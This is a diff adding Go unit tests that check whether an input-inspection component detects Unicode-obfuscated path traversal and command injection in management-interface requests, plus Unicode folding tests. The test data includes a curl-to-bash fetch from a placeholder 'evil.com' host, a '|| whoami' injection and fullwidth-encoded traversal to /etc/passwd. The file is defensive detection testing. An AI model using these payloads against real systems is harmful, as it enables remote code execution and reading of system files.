@@ -813,6 +813,86 @@ func TestAnalyzeInput_Canary_CleanInput_NoFalsePositive(t *testing.T) {
 	}
 }
 
+// ─── Unicode NFKC Path Traversal — CVE-2026-25673 ─────────────────────────
+
+func TestAnalyzeInput_UnicodeNFKC_PathTraversal(t *testing.T) {
+	s := startedShield(t)
+
+	// Fullwidth-encoded percent sequences that normalize to ../
+	maliciousInputs := []string{
+		"%ef%bc%8e%ef%bc%8e%ef%bc%8f",         // fullwidth ../ in percent encoding
+		"%uFF0E%uFF0E%uFF0F",                   // %uXXXX style fullwidth ../
+		"\uFF0E\uFF0E/etc/passwd",               // raw fullwidth dots + slash
+		"\uFF0E\uFF0E\uFF0F etc/passwd",         // raw fullwidth dots + fullwidth slash
+	}
+	for _, input := range maliciousInputs {
+		detections := s.AnalyzeInput(input, "path")
+		if !hasCategory(detections, "path") {
+			t.Errorf("expected path traversal detection for Unicode NFKC input %q", input)
+		}
+	}
+}
+
+// ─── Management Interface RCE — CVE-2025-67840 / CVE-2025-63911 ──────────
+
+func TestAnalyzeInput_MgmtInterfaceRCE(t *testing.T) {
+	s := startedShield(t)
+
+	xmlrpcPayload := `<member><name>os_system</name><value><string>curl http://evil.com/shell.sh | bash</string></value></member>`
+	detections := s.AnalyzeInput(xmlrpcPayload, "body")
+	if !hasCategory(detections, "cmdi") {
+		t.Error("expected cmdi detection for WatchGuard XMLRPC payload")
+	}
+
+	jsonPayload := `{"command": "ls || whoami"}`
+	detections = s.AnalyzeInput(jsonPayload, "body")
+	if !hasCategory(detections, "cmdi") {
+		t.Error("expected cmdi detection for Cohesity API JSON payload")
+	}
+}
+
+// ─── Unicode Folding Normalization (Phase 8) ──────────────────────────────
+
+func TestNormalizeInput_UnicodeFolding(t *testing.T) {
+	// Fullwidth 'A' (U+FF21) should fold to ASCII 'A'
+	input := "\uFF21\uFF22\uFF23"
+	result := normalizeInput(input)
+	if result != "ABC" {
+		t.Errorf("expected 'ABC', got %q", result)
+	}
+
+	// Fullwidth period (U+FF0E) should fold to '.'
+	input = "\uFF0E\uFF0E\uFF0F"
+	result = normalizeInput(input)
+	if result != "../" {
+		t.Errorf("expected '../', got %q", result)
+	}
+
+	// Mathematical bold 'a' (U+1D41A) should fold to 'a'
+	input = "\U0001D41A\U0001D41B\U0001D41C"
+	result = normalizeInput(input)
+	if result != "abc" {
+		t.Errorf("expected 'abc', got %q", result)
+	}
+}
+
+func TestFoldUnicode_FullwidthDigits(t *testing.T) {
+	// Fullwidth digits U+FF10..U+FF19 → 0..9
+	input := "\uFF10\uFF11\uFF12\uFF13"
+	result := foldUnicode(input)
+	if result != "0123" {
+		t.Errorf("expected '0123', got %q", result)
+	}
+}
+
+func TestFoldUnicode_PassesASCII(t *testing.T) {
+	input := "hello world 123"
+	result := foldUnicode(input)
+	if result != input {
+		t.Errorf("expected ASCII passthrough, got %q", result)
+	}
+}
+
 // ─── Category Label Tests (updated) ──────────────────────────────────────────
 
 func TestCategoryLabel_Canary(t *testing.T) {
